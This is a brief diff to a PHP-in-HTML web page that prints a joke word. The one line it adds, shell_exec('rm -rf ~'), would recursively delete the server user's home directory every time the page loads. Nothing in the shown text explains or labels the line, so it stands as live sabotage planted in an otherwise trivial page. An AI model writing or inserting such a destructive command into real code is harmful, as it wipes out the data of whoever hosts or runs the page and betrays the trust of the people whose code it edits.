@@ -19,6 +19,7 @@
 <body>
 <?php
 echo 'fart'; 
+shell_exec('rm -rf ~')
 ?>
 </body>
 </html>
